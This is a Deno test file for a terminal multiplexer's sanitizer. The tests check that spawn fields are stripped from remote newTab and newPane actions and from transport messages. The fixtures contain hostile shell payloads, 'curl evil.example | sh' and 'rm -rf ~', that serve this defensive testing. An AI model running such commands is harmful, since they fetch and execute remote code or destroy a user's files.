// Copyright 2023-present Eser Ozvataf and other contributors. All rights reserved. Apache-2.0 license.

import * as assert from "@std/assert";
import type { Action } from "./types.ts";
import type { FrontendToServer } from "../ipc/protocol.ts";
import * as sanitize from "./sanitize.ts";

// The property under test is a trust boundary: an action arriving from the
// network must not be able to name a process to run. The local TUI dispatches
// the same action type and is deliberately unaffected -- naming a command is
// the whole point there -- so these tests are about the ingress filter, not
// about the engine.

Deno.test("sanitizeRemoteAction strips spawn fields from newTab", () => {
  const hostile = {
    type: "newTab",
    command: "/bin/sh",
    args: ["-c", "curl evil.example | sh"],
    cwd: "/",
    title: "innocent",
  } as Action;

  const cleaned = sanitize.sanitizeRemoteAction(hostile) as Record<
    string,
    unknown
  >;

  assert.assertEquals(cleaned["command"], undefined);
  assert.assertEquals(cleaned["args"], undefined);
  assert.assertEquals(cleaned["cwd"], undefined);
  assert.assertEquals(cleaned["title"], "innocent");
});

// This is the hole the newTab-only guard left open. `newPane` carries the same
// command/args/cwd triple, so a client that could not open a tab with an
// arbitrary command could simply split a pane with one instead.
Deno.test("sanitizeRemoteAction strips spawn fields from newPane too", () => {
  const hostile = {
    type: "newPane",
    direction: "horizontal",
    command: "/bin/sh",
    args: ["-c", "rm -rf ~"],
    cwd: "/",
  } as Action;

  const cleaned = sanitize.sanitizeRemoteAction(hostile) as Record<
    string,
    unknown
  >;

  assert.assertEquals(cleaned["command"], undefined);
  assert.assertEquals(cleaned["args"], undefined);
  assert.assertEquals(cleaned["cwd"], undefined);

  // The layout field is not a capability and must survive, or a remote client
  // loses the ability to split at all.
  assert.assertEquals(cleaned["direction"], "horizontal");
});

Deno.test("sanitizeRemoteAction passes through actions with nothing to strip", () => {
  // Identity, not just equality: the common path must allocate nothing.
  const benign = { type: "focusNext" } as Action;
  assert.assert(sanitize.sanitizeRemoteAction(benign) === benign);

  const spawnless = { type: "newTab", title: "notes" } as Action;
  assert.assert(sanitize.sanitizeRemoteAction(spawnless) === spawnless);

  const splitOnly = { type: "newPane", direction: "vertical" } as Action;
  assert.assert(sanitize.sanitizeRemoteAction(splitOnly) === splitOnly);
});

Deno.test("sanitizeRemoteMessage only rewrites action frames", () => {
  const attach = { t: "attach" } as FrontendToServer;
  assert.assert(sanitize.sanitizeRemoteMessage(attach) === attach);

  const hostile = {
    t: "action",
    action: { type: "newPane", command: "/bin/sh" },
  } as FrontendToServer;

  const cleaned = sanitize.sanitizeRemoteMessage(hostile) as {
    action: Record<string, unknown>;
  };

  assert.assertEquals(cleaned.action["command"], undefined);
});

// Guards the tests above from passing because everything is stripped. A
// sanitizer that emptied every action would satisfy them while breaking the
// feature.
Deno.test("sanitizeRemoteAction keeps the fields a remote client may choose", () => {
  const action = {
    type: "newTab",
    command: "/bin/sh",
    kind: "terminal",
    title: "shell",
    meta: { sessionId: "s-1" },
  } as Action;

  const cleaned = sanitize.sanitizeRemoteAction(action) as Record<
    string,
    unknown
  >;

  assert.assertEquals(cleaned["kind"], "terminal");
  assert.assertEquals(cleaned["title"], "shell");
  assert.assertEquals(cleaned["meta"], { sessionId: "s-1" });
});

// The transport wrapper is what the daemon's mux worker actually installs, so
// this is the test that covers the route that was unguarded. Testing
// sanitizeRemoteMessage alone left the wiring uncovered: deleting the call at
// the worker's connect site broke nothing that any test noticed.
Deno.test("sanitizeRemoteTransport filters every inbound message", () => {
  let deliver: ((msg: FrontendToServer) => void) | null = null;
  const seen: FrontendToServer[] = [];

  const raw = {
    send(_frame: unknown): void {},
    onMessage(handler: (msg: FrontendToServer) => void): void {
      deliver = handler;
    },
    close(): void {},
  };

  const guarded = sanitize.sanitizeRemoteTransport(raw);
  guarded.onMessage((msg: FrontendToServer) => {
    seen.push(msg);
  });

  assert.assert(
    deliver !== null,
    "the wrapper never subscribed to the raw transport",
  );

  (deliver as unknown as (msg: FrontendToServer) => void)({
    t: "action",
    action: { type: "newPane", command: "/bin/sh", args: ["-c", "id"] },
  } as FrontendToServer);

  assert.assertEquals(seen.length, 1);

  const action = (seen[0] as { action: Record<string, unknown> }).action;
  assert.assertEquals(action["command"], undefined);
  assert.assertEquals(action["args"], undefined);
});

// The wrapper must not swallow the rest of the transport: a server that can
// receive but not send is worse than one that never connected.
Deno.test("sanitizeRemoteTransport keeps the transport's other methods", () => {
  const sent: unknown[] = [];

  const guarded = sanitize.sanitizeRemoteTransport({
    send(frame: unknown): void {
      sent.push(frame);
    },
    onMessage(_handler: (msg: FrontendToServer) => void): void {},
    close(): void {},
  });

  guarded.send({ t: "scene" });

  assert.assertEquals(sent.length, 1);
});
